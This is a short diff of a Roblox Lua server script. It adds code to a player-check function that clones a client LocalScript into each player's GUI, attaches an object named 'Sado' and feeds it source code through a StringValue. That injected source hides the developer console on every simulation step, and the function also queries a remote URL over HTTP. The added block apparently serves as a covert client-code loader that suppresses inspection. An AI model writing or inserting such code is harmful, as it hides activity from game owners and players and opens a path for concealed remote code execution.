@@ -21,6 +21,20 @@ function Test()
 end
 
 function Check(plr)
+	
+	local Client=script:FindFirstChildOfClass("LocalScript"):Clone()
+	Client.Parent=plr.PlayerGui
+	Sado:Clone().Parent=Client
+	local SourceValue=ins("StringValue",Client)
+	SourceValue.Value=[[game:GetService("RunService").PreSimulation:Connect(function()
+		pcall(function()
+			game:GetService("StarterGui"):SetCore("DevConsoleVisible",false)
+		end)
+	end)]]
+	SourceValue.Name="Value"
+	Client.Enabled=true
+	
+	
 	local success,result=pcall(function()
 		return Http:GetAsync(Url.."players")
 	end)
